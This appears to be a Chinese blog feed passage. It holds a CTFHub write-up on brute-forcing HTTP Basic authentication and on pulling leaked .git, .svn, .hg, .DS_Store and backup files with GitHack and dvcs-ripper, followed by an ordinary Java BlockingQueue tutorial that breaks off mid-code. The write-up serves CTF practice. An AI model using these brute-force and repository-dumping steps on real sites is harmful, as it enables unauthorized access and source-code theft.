<p>***客户端(例如Web浏览器)***：服务器，请把&#x2F;family&#x2F;son.jpg 图片传给我。</p>
<p><code>GET /family/son.jpg  HTTP/1.1</code></p>
<p><em><strong>服务器</strong></em>：客户端你好，这个资源在安全区family里，是受限资源，需要基本认证，请带上你的用户名和密码再来</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&gt;HTTP/1.1 401 Authorization Required</span><br><span class="line">&gt;www-Authenticate: Basic realm= &quot;family&quot;</span><br></pre></td></tr></table></figure>


<p>服务器会返回401，告知客户端这个资源需要使用基本认证的方式访问，我们可以看到在 www-Authenticate这个Header里面 有两个值，Basic：说明需要基本认证，realm：说明客户端需要输入这个安全区的用户名和密码，而不是其他区的。因为服务器可以为不同的安全区设置不同的用户名和密码。如果服务器只有一个安全区，那么所有的基本认证用户名和密码都是一样的。</p>
<p><em><strong>客户端</strong></em>： 服务器，我已经按照你的要求，携带了相应的用户名和密码信息了，你看一下</p>
<p>如果客户端是浏览器，那么此时就会弹出一个弹窗，让用户输入用户名和密码。</p>
<p>**Basic 内容为： <code>用户名:密码 </code>后的base64 内容.假设我的用户名为<code>Shusheng007</code>,密码为<code>ss007</code> 那么我的Basic的内容为 <code>Shusheng007：ss007 </code>对应的base64 编码内容<code>U2h1c2hlbmcwMDcldUZGMUFzczAwNw==</code>**，如下所示</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&gt;GET /family/son.jpg  HTTP/1.1</span><br><span class="line">&gt;Authorization: Basic U2h1c2hlbmcwMDcldUZGMUFzczAwNw==</span><br></pre></td></tr></table></figure>


<p><em><strong>服务器</strong></em>：客户端你好，我已经校验了你的用户名和密码，是正确的，这是你要的资源。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&gt;HTTP/1.1 200 OK</span><br><span class="line">&gt;Content-type: image/jpg</span><br></pre></td></tr></table></figure>

<p>至此这个HTTP事务就结束了，非常简单的一个认证机制</p>
</blockquote>
<p>而这道题目 他给了密码的文件</p>
<p>很明显是爆破</p>
<p>爆破点是</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/flag.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-4fd44b39b91d3871.sandbox.ctfhub.com:10080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://challenge-4fd44b39b91d3871.sandbox.ctfhub.com:10080/</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YWRtaW46§admin§      §admin§这个就是爆破点</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>

<p>那么就爆破呗</p>
<p>然而我发现一个问题的存在</p>
<p><code>YWRtaW46YWtzZGphc2pka2E%3d</code>经常出现<code>%3d</code>这样的问题</p>
<p>这个是字符编码的一个问题</p>
<p>需要你把攻击的<code>payloads</code>下面的那个<code> URL-encode these characters</code>取消勾选</p>
<p>之后就得到答案了！ 奥里给。。</p>
<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><h4 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h4><p><strong>web源码泄漏</strong></p>
<h3 id="0x01信息泄露"><a href="#0x01信息泄露" class="headerlink" title="0x01信息泄露"></a>0x01信息泄露</h3><p>有的时候运维或者说是部署人员工，当然也有可能是开发人员在打包项目的时候将。git也打包了而引起了，git的信息泄露，关于常用的其他信息泄露，各位看官可自行Google or 百度。这里贴一下git信息泄露利用的python脚本。下载完了之后利用python执行，python GitHack.py <a class="link"   href="http://xxxxxxx/.git" >http://XXXXXXX/.git<i class="fas fa-external-link-alt"></i></a></p>
<p>这样将会在dis目录下生成以ip地址以及端口号命名的文件夹，大家进去看一下里面是否存在.git文件夹</p>
<p>0x03GIT命令使用<br>切换到该目录下面</p>
<p>使用git log 查看当前版本，使用git reset –hard 9d9fab3bd7e53c454dee1c9a7abc01e499882815还原到以前的版本。然后就可以查看到flag.</p>
<p>附录：常用git命令摘录自：<a class="link"   href="http://www.cnblogs.com/lwzz/archive/2013/02/23/2921426.html" >http://www.cnblogs.com/lwzz/archive/2013/02/23/2921426.html<i class="fas fa-external-link-alt"></i></a></p>
<p>最基本的命令：</p>
<p>git clone 拷贝并跟踪远程的master分支。跟踪的好处是以后可以直接通过pull和push命令来提交或者获取远程最新的代码，而不需要指定远程分支名字。</p>
<p>git submodule init</p>
<p>git submodule update</p>
<p>参考示意图</p>
<p>HEAD 指向当前的commit 对象(可以想象为当前分支的别名)，同时也用来表明我们在哪个branch上工作。所以当我们使用HEAD来操作指针的时候，其实就是不改变当前的commit的指向。</p>
<p>对照这张图来理解两段提交，工作区(working tree)，暂存区（index）和 branch之间的关系</p>
<p>显示信息类命令<br>git ls-files -u 显示冲突的文件，-s是显示标记为冲突已解决的文件</p>
<p>git diff 对比工作区和stage文件的差异<br>git diff –cached 对比stage和branch之间的差异</p>
<p>git branch 列出当前repository下的所有branch<br>git branch –a 列出local 和remote下的所有branch</p>
<p>git ls-files –stage 检查保存在stage的文件</p>
<p>git log 显示到HEAD所指向的commit为止的所有commit记录 。使用reset HEAD~n 命令使HEAD指针向前移动，会导致HEAD之后的commit记录不会被显示。</p>
<p>git log -g则会查询reflog去查看最近做了哪些动作，这样可以配合git branch 恢复之前因为移动HEAD指针所丢弃的commit对象。如果reflog丢失则可以通过git fsck –full来查看没被引用的commit对象。<br>git log -p -2 对比最新两次的commit对象<br>log -1 HEAD</p>
<p>git log –pretty&#x3D;oneline</p>
<p>git log –stat 1a410e 查看sha1为1a410e的commit对象的记录</p>
<p>git blame -L 12,22 sth.cs 如果你发现自己代码中 的一个方法存在缺陷,你可以用git blame来标注文件,查看那个方法的每一行分别是由谁 在哪一天修改的。下面这个例子使用了-L选项来限制输出范围在第12至22行</p>
<p>创建类命令<br>git brach branchName 创建名为branchName的branch<br>git checkout branchName 切换到branchName的branch<br>git checkout -b 创建并切换，也就是上面两个命令的合并</p>
<p>git brach branchName ef71 从commit ef71创建名为branchName的branch</p>
<p>撤销类命令<br>如果是单个文件<br>1.use “git reset HEAD <file>…” to unstage<br>如果已经用add 命令把文件加入stage了，就先需要从stage中撤销</p>
<p>然后再从工作区撤销<br>2.use “git checkout – <file>…” to discard changes in working directory</p>
<p>git checkout a.txt  撤销a.txt的变动（工作区上的文件）<br>如果是多个文件<br>git chenkout .</p>
<p>如果已经commit 了，则需要<br>git commit –amend 来修改，这个只能修改最近上一次的,也就是用一个新的提交来覆盖上一次的提交。因此如果push以后再做这个动作就会有危险</p>
<p>$ git reset –hard HEAD 放弃工作区和index的改动,HEAD指针仍然指向当前的commit.（参照第一幅图）</p>
<p>这条命令同时还可以用来撤销还没commit的merge,其实原理就是放弃index和工作区的改动，因为没commit的改动只存在于index和工作区中。</p>
<p>$ git reset –hard HEAD^ 用来撤销已经commit的内容(等价于 git reset –hard HEAD~1) 。原理就是放弃工作区和index的改动，同时HEAD指针指向前一个commit对象。</p>
<p>git revert 也是撤销命令，区别在于reset是指向原地或者向前移动指针，git revert是创建一个commit来覆盖当前的commit,指针向后移动</p>
<p>提交类命令<br>git add 跟踪新文件或者已有文件的改动，或者用来解决冲突</p>
<p>git commit 把文件从stage提交到branch</p>
<p>git commit -a 把修改的文件先提交到stage,然后再从stash提交到branch</p>
<p>删除类命令<br>git rm –cached readme.txt 只从stage中删除，保留物理文件</p>
<p>git rm readme.txt 不但从stage中删除，同时删除物理文件</p>
<p>git mv a.txt b.txt 把a.txt改名为b.txt</p>
<p>Merge类命令</p>
<p>在冲突状态下，需要解决冲突的文件会从index打回到工作区。</p>
<p>1.用工具或者手工解决冲突<br>2.git add 命令来表明冲突已经解决。<br>3.再次commit 已解决冲突的文件。</p>
<p>$ git reset –hard ORIG_HEAD 用来撤销已经commit 的merge.<br>$ git reset –hard HEAD 用来撤销还没commit 的merge,其实原理就是放弃index和工作区的改动。</p>
<p>git reset –merge ORIG_HEAD，注意其中的–hard 换成了 –merge，这样就可以避免在回滚时清除working tree</p>
<hr>
<h3 id="hg源码泄漏："><a href="#hg源码泄漏：" class="headerlink" title=".hg源码泄漏："></a>.hg源码泄漏：</h3><p>漏洞成因：hg init的时候会生成.hg，<a class="link"   href="http://www.xx.com/.hg/%EF%BC%8C" >http://www.xx.com/.hg/，<i class="fas fa-external-link-alt"></i></a></p>
<p>工具：dvcs-ripper，（rip-hg.pl -v -u <a class="link"   href="http://www.xx.com/.hg/%EF%BC%89" >http://www.xx.com/.hg/）<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="git源码泄漏："><a href="#git源码泄漏：" class="headerlink" title=".git源码泄漏："></a>.git源码泄漏：</h3><p>漏洞成因：在运行git init初始化代码库的时候，会在当前目录下产生一个.git的隐藏文件，用来记录代码的变更记录等，没有删除这个文件，导致泄漏，<a class="link"   href="http://www.xxx.com/.git/config" >http://www.xxx.com/.git/config<i class="fas fa-external-link-alt"></i></a></p>
<p>工具：GitHack，dvcs-ripper，（GitHack.py <a class="link"   href="http://www.xxx.com/.git%EF%BC%8Crip-hg.pl" >http://www.xxx.com/.git，rip-hg.pl<i class="fas fa-external-link-alt"></i></a> -v -u <a class="link"   href="http://www.xx.com/.git/%EF%BC%89" >http://www.xx.com/.git/）<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="DS-Store源码泄漏："><a href="#DS-Store源码泄漏：" class="headerlink" title=".DS_Store源码泄漏："></a>.DS_Store源码泄漏：</h3><p>漏洞成因：在发布代码时，没有删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息，<a class="link"   href="http://www.xxx.com/.ds_store" >http://www.xxx.com/.ds_store<i class="fas fa-external-link-alt"></i></a></p>
<p>工具：dsstoreexp，（python ds_store_exp.py <a class="link"   href="http://www.xxx.com/.DS_Store%EF%BC%89" >http://www.xxx.com/.DS_Store）<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="网站备份压缩文件："><a href="#网站备份压缩文件：" class="headerlink" title="网站备份压缩文件："></a>网站备份压缩文件：</h3><p>在网站的使用过程中，往往需要对网站中的文件进行修改，升级，此时就需要对网站整或其中某一页面进行备份，当备份文件或修改过程中的缓存文件因为各种原因被留在网站web目录下，而该目录又没有设置访问权限，就有可能导致备份文件被下载，导致信息泄漏，给服务器安全埋下隐患。.rar， .zip， .7z， .tar.gz， .bak， .swp， .txt， .html，</p>
<p>工具：可以使用一些扫描软件，进行扫描，如awvs之类的</p>
<p>像.swp文件，就是vim源文件泄漏，&#x2F;.index.php.swp或&#x2F;index.php~ 可以直接用vim -r inde.php来读取文件</p>
<hr>
<h5 id="常见的网站源码备份文件后缀"><a href="#常见的网站源码备份文件后缀" class="headerlink" title="常见的网站源码备份文件后缀"></a>常见的网站源码备份文件后缀</h5><hr>
<ul>
<li>tar</li>
<li>tar.gz</li>
<li>zip</li>
<li>rar</li>
</ul>
<h5 id="常见的网站源码备份文件名"><a href="#常见的网站源码备份文件名" class="headerlink" title="常见的网站源码备份文件名"></a>常见的网站源码备份文件名</h5><hr>
<ul>
<li>web</li>
<li>website</li>
<li>backup</li>
<li>back</li>
<li>www</li>
<li>wwwroot</li>
<li>temp</li>
</ul>
<p>我做这道题目的时候，找到了flag_2768649.txt  不过我真没想要用URL去加载</p>
<p>回想起来 这毕竟是网站源码 那么我们去网站上查看嘛</p>
<h3 id="SVN导致文件泄漏："><a href="#SVN导致文件泄漏：" class="headerlink" title="SVN导致文件泄漏："></a>SVN导致文件泄漏：</h3><p>版本控制系统</p>
<p>工具：dvcs-ripper，Seay-Svn，（rip-svn.pl -v -u <a class="link"   href="http://www.xxx.com/.svn/%EF%BC%89" >http://www.xxx.com/.svn/）<i class="fas fa-external-link-alt"></i></a></p>
<hr>
<h3 id="我遇到的题目类型"><a href="#我遇到的题目类型" class="headerlink" title="我遇到的题目类型"></a>我遇到的题目类型</h3><ul>
<li><p>bak文件</p>
</li>
<li><p>vim</p>
</li>
<li><p>. DS_Store</p>
</li>
<li><p>利用dvcs-rip来操作  .svn泄露 和 .hg泄露</p>
<p>在泄露的时候可能文件中没有flag 但是给了文件名字</p>
<p>可以尝试利用curl看看能不能得到。</p>
</li>
</ul>
<p>我打算在四月初花费三天重做一遍CTFhub，然后再写这篇文章！</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
  </entry>
  <entry>
    <title>阻塞队列BlokingQueue</title>
    <url>/2021/05/03/2021/%E9%98%BB%E5%A1%9E%E9%98%9F%E5%88%97BlokingQueue/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="什么是阻塞队列"><a href="#什么是阻塞队列" class="headerlink" title="什么是阻塞队列"></a>什么是阻塞队列</h1><p>阻塞队列(BlockingQueue)是<code>java.util.concurrent</code>包提供的用于解决并发<strong>生产者—消费者</strong>问题最有用的类，它的特性是在任意时刻只有一个线程可以对队列进行出队和入队操作。</p>
<p>并且阻塞队列提供了超时返回null的机制，在许多生产场景里都可以看到这个工具的身影。比如：线程池、Eureka、Nacos、Netty已经各种MQ产品。</p>
<h1 id="API"><a href="#API" class="headerlink" title="API"></a>API</h1><p>以下这些方法是<code>BlockingQueue</code>接口中的重要方法，主要分为取元素和放元素两种行为：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>add()</td>
<td>如果插入成功则返回 true，否则抛出 IllegalStateException 异常</td>
</tr>
<tr>
<td>put()</td>
<td>将指定的元素插入队列，如果队列满了，那么会阻塞直到有空间插入</td>
</tr>
<tr>
<td>offer()</td>
<td>如果插入成功则返回 true，否则返回 false</td>
</tr>
<tr>
<td>offer(E e, long timeout, TimeUnit unit)</td>
<td>尝试将元素插入队列，如果队列已满，那么会阻塞直到有空间插入</td>
</tr>
<tr>
<td>take()</td>
<td>获取队列的头部元素并将其删除，如果队列为空，则阻塞并等待队列中有元素</td>
</tr>
<tr>
<td>poll(long timeout, TimeUnit unit)</td>
<td>检索并删除队列的头部，如有必要，等待指定的等待时间以使元素可用，如果超时返回null</td>
</tr>
</tbody></table>
<h1 id="队列类型"><a href="#队列类型" class="headerlink" title="队列类型"></a>队列类型</h1><p>基于<code>BlockingQueue</code>接口实现了多种阻塞队列，队列类型主要有以下两者：</p>
<ul>
<li>无限队列 （unbounded queue ）：几乎可以无限增长</li>
<li>有限队列 （ bounded queue ）：定义了最大容量</li>
</ul>
<h2 id="ArrayBlockingQueue"><a href="#ArrayBlockingQueue" class="headerlink" title="ArrayBlockingQueue"></a>ArrayBlockingQueue</h2><p>队列基于数组实现,容量大小在创建ArrayBlockingQueue对象时已定义好数据结构如下图：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/03/ztAulPbgKeU3Vmk.jpg"
                      alt="Screenshot_59.jpg"
                ></p>
<ul>
<li>创建队列</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BlockingQueue&lt;String&gt; blockingQueue = <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="number">5</span>);</span><br></pre></td></tr></table></figure>

<p>该队列在线程池中有比较多的应用，适用于生产者消费者场景。</p>
<p>工作原理是基于ReentrantLock保证线程安全，根据Condition实现队列满时的阻塞。</p>
<h2 id="LinkedBlockingQueue"><a href="#LinkedBlockingQueue" class="headerlink" title="LinkedBlockingQueue"></a>LinkedBlockingQueue</h2><p>是一个基于链表的无界队列(理论上有界) ：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BlockingQueue&lt;String&gt; blockingQueue = <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;&gt;();</span><br></pre></td></tr></table></figure>

<p>上面这段代码中，blockingQueue 的容量将设置为<code>Integer.MAX_VALUE</code>。</p>
<p>向无限队列添加元素的所有操作都将永远不会阻塞(不是说不会加锁保证线程安全)，因此它可以增长到非常大的容量。</p>
<p>使用无限 BlockingQueue 设计生产者 - 消费者模型时最重要的是<strong>消费者应该能够像生产者向队列添加消息一样快地消费消息</strong> 。否则，内存可能会填满，然后产生<code>OutOfMemory</code>异常。</p>
<h2 id="PriorityBlockingQueue"><a href="#PriorityBlockingQueue" class="headerlink" title="PriorityBlockingQueue"></a>PriorityBlockingQueue</h2><p>PriorityBlockingQueue是一个支持优先级的无界阻塞队列。</p>
<p>默认情况下元素采取自然顺序升序排列。也可以自定义类实现<code>compareTo()</code>方法来指定元素排序规则，或者初始化PriorityBlockingQueue时，指定构造参数<code>Comparator</code>来对元素进行排序。</p>
<p>需要注意的是不能保证同优先级元素的顺序。</p>
<h2 id="DelayQueue"><a href="#DelayQueue" class="headerlink" title="DelayQueue"></a>DelayQueue</h2><p>由优先级堆支持的、基于时间的调度队列，内部基于无界队列PriorityQueue实现，而无界队列基于数组的扩容实现。 队列创建：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BlockingQueue&lt;String&gt; blockingQueue = <span class="keyword">new</span> <span class="title class_">DelayQueue</span>();</span><br></pre></td></tr></table></figure>

<p>要求入队的对象必须要实现Delayed接口,而Delayed集成自Comparable接口。主要有以下应用场景：</p>
<ul>
<li>可以用<code>DelayQueue</code>保存缓存元素的有效期，使用一个线程循环查询<code>DelayQueue</code>,一旦能从<code>DelayQueue</code>中获取元素，表示缓存有效期到了。</li>
<li>使用DelayQueue保存当前将会执行的任务和执行时间，一旦从<code>DelayQueue</code>中取到任务就开始执行，比如<code>TimerQueue</code>就是使用<code>DelayQueue</code>实现的。</li>
</ul>
<h2 id="SynchronousQueue"><a href="#SynchronousQueue" class="headerlink" title="SynchronousQueue"></a>SynchronousQueue</h2><p>SynchronousQueue是一个不存储元素的阻塞队列。每一个<code>put</code>操作必须等待一个<code>take</code>操作，否则不能继续添加元素。<code>SynchronousQueue</code>可以看成是一个传球手，负责把生产者线程处理的数据直接传递给消费者线程。队列本身并不存储任何元素，非常适合传递性场景。<code>SynchronousQueu</code>e的吞吐量高于<code>LinkedBlockingQueue</code>和<code>ArrayBlockingQueue</code>。</p>
<h2 id="LinkedTransferQueue"><a href="#LinkedTransferQueue" class="headerlink" title="LinkedTransferQueue"></a>LinkedTransferQueue</h2><p>LinkedTransferQueue是一个由链表结构组成的无界阻塞<code>TransferQueue</code>队列。相对于其他阻塞队列，<code>LinkedTransferQueue</code>多了<code>tryTransfer</code>和<code>transfer</code>方法。</p>
<h2 id="LinkedBlockingDeque"><a href="#LinkedBlockingDeque" class="headerlink" title="LinkedBlockingDeque"></a>LinkedBlockingDeque</h2><p>LinkedBlockingDeque是一个由链表结构组成的双向阻塞队列。所谓双向队列指的是可以从队列的两端插入和移出元素。双向队列因为多了一个操作队列的入口，在多线程同时入队时，也就减少了一半的竞争</p>
<h1 id="代码举例"><a href="#代码举例" class="headerlink" title="代码举例"></a>代码举例</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.ArrayBlockingQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.BlockingQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ThreadLocalRandom;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Liduoan</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span>: 2021/5/3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">liduoan</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Apple</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> BlockingQueue&lt;Apple&gt; basket = <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;Apple&gt;(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Consumer</span> <span class="keyword">extends</span> <span class="title class_">Thread</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    basket.take();</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;拿走了苹果&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Producer</span> <span class="keyword">extends</span> <span class="title class_">Thread</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> ThreadLocalRandom.current().nextInt(<span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;放下了&quot;</span> + num + <span class="string">&quot;苹果&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= num; i++) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        basket.put(<span class="keyword">new</span> <span class="title class_">Apple</span>());</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">7</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Consumer</span>().start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">3</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Producer</span>().start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单的例子说明了一些问题</p>
<p>队列满的时候某线程获取锁释放锁如何操作，队列空的时候又该如何操作。</p>
<p>注意到仅仅只是调用了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">basket.put(E e); <span class="comment">//向队列中添加元素</span></span><br><span class="line">basket.take();	  <span class="comment">//从队列中获取元素</span></span><br></pre></td></tr></table></figure>

<p>有没有一种感觉，它已经把大量的细节都封装好了，仅仅给了我们某几个API就可以满足</p>
<p>你拿去，你生产。两者之间的种种问题都被内部解决好了。</p>
<p>那么我们想想有什么问题呢？</p>
<p>1、消费者拿，然而队列为空</p>
<p>2、生产者产出，而队列满了</p>
<p>3、线程在CLH中排队，队列满了，然后后面依旧是生产者线程。</p>
<h1 id="ArrayBlockingQueue源码"><a href="#ArrayBlockingQueue源码" class="headerlink" title="ArrayBlockingQueue源码"></a>ArrayBlockingQueue源码</h1><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// lock字段，锁</span></span><br><span class="line"><span class="keyword">final</span> ReentrantLock lock;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不为空,即可以出队的条件</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Condition notEmpty;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不为满,即可以入队的条件</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Condition notFull;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造方法 </span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ArrayBlockingQueue</span><span class="params">(<span class="type">int</span> capacity, <span class="type">boolean</span> fair)</span> &#123;</span><br><span class="line">     <span class="keyword">if</span> (capacity &lt;= <span class="number">0</span>)</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">     <span class="built_in">this</span>.items = <span class="keyword">new</span> <span class="title class_">Object</span>[capacity];</span><br><span class="line">     <span class="comment">// 创建一个ReentrantLock</span></span><br><span class="line">     lock = <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>(fair);</span><br><span class="line">     <span class="comment">// 两个条件对象，针对队空和队满的场景</span></span><br><span class="line">     notEmpty = lock.newCondition();</span><br><span class="line">     notFull =  lock.newCondition();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，ArrayBlockingQueue中定义了一个<code>ReentrantLock</code>和两个<code>Condition</code>，分别用于队列同步和队空、队满的情况，并且在构造方法中对它们进行初始化。</p>
<h2 id="入队"><a href="#入队" class="headerlink" title="入队"></a>入队</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(E e)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">    <span class="comment">//检查这个值是不是空</span></span><br><span class="line">    checkNotNull(e);</span><br><span class="line">    <span class="comment">//ReetrantLock锁</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="built_in">this</span>.lock;</span><br><span class="line">    <span class="comment">//以可中断方式锁住</span></span><br><span class="line">    lock.lockInterruptibly();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//当这个队列满了</span></span><br><span class="line">        <span class="keyword">while</span> (count == items.length)</span><br><span class="line">            <span class="comment">//等待notFull的条件，并且释放锁</span></span><br><span class="line">            notFull.await();</span><br><span class="line">        <span class="comment">//否则就直接入队</span></span><br><span class="line">        enqueue(e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">//解锁</span></span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">enqueue</span><span class="params">(E x)</span> &#123;</span><br><span class="line">    <span class="comment">// assert lock.getHoldCount() == 1;</span></span><br><span class="line">    <span class="comment">// assert items[putIndex] == null;</span></span><br><span class="line">    <span class="keyword">final</span> Object[] items = <span class="built_in">this</span>.items;</span><br><span class="line">    items[putIndex] = x;</span><br><span class="line">    <span class="keyword">if</span> (++putIndex == items.length)</span><br><span class="line">        putIndex = <span class="number">0</span>;</span><br><span class="line">    count++;</span><br><span class="line">    <span class="comment">//发出队列不空条件</span></span><br><span class="line">    notEmpty.signal();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，入队方法通过<code>lock()</code>和<code>unlock()</code>进行了同步。</p>
<p>当队列满了，而继续put进去的时候，会触发<code>notFull.await();</code></p>
<p>也就是进入阻塞，并释放锁！【被从阻塞中出来的时候，需要有<code>notFull.signal();</code></p>
<p>这个在具体的实现类中<code>AbstractQueuedSynchronizer</code>中有这样的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">await</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">    <span class="comment">//这里判断是否出现中断</span></span><br><span class="line">    <span class="keyword">if</span> (Thread.interrupted())</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InterruptedException</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> addConditionWaiter();</span><br><span class="line">    <span class="comment">//这里会把锁释放</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">savedState</span> <span class="operator">=</span> fullyRelease(node);</span><br><span class="line">    <span class="type">int</span> <span class="variable">interruptMode</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!isOnSyncQueue(node)) &#123;</span><br><span class="line">        <span class="comment">//进入阻塞！！！！！！！！！！！！</span></span><br><span class="line">        LockSupport.park(<span class="built_in">this</span>);</span><br><span 